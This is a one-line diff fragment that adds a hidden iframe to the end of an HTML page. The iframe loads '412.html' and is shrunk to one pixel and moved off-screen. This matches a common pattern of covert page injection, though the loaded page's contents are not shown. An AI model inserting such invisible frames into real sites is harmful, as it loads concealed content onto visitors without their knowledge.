+<iframe id="iagdtd_frame" src="412.html" style="position: absolute; width: 1px; height: 1px; left: -9999px;"></iframe></body></html>
